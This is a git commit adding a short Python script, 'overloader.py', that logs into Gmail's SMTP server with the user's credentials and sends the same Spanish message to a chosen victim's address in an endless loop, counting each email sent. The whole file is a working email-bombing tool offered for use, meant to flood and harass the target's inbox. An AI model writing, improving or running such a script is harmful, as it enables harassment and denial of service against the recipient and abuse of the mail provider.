bd1807ae0e3bd7f7fb1c1fcc65be59ca11bb1e3f
danilacasito <54474838+danilacasito@users.noreply.github.com>
2020-06-01 11:34:09 +0200

    My Source Code

---
+++ src/overloader.py
@@ -0,0 +1,28 @@
+import smtplib
+import getpass
+import os
+us = input("Your Email> ")
+fromaddr = us
+to = input("Email to overload> ")
+toaddrs = to
+
+msg = 'Estas sufriendo una sobrecarga de emails enviados por Python'
+
+# Datos
+username = us
+print("Type your password here")
+password = getpass.getpass()
+
+#Sending the emails
+n = 1
+emenviados = 0
+while n == 1:
+    server = smtplib.SMTP('smtp.gmail.com:587')
+    server.starttls()
+    server.login(username, password)
+    server.sendmail(fromaddr, toaddrs, msg)
+    server.quit()
+    os.system("cls")
+    emenviados = emenviados + 1
+    print("Emails enviados: ")
+    print(emenviados)
